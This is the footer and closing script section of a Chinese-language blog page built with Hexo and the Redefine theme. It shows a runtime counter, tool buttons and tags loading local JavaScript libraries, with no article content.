            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.3</a></span>
        </div>
        
        
            <div>
                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>





    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>








    
<script src="/js/libs/anime.min.js"></script>





    
<script src="/js/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/layouts/essays.js" type="module" data-swup-reload-script=""></script>




</body>
</html>
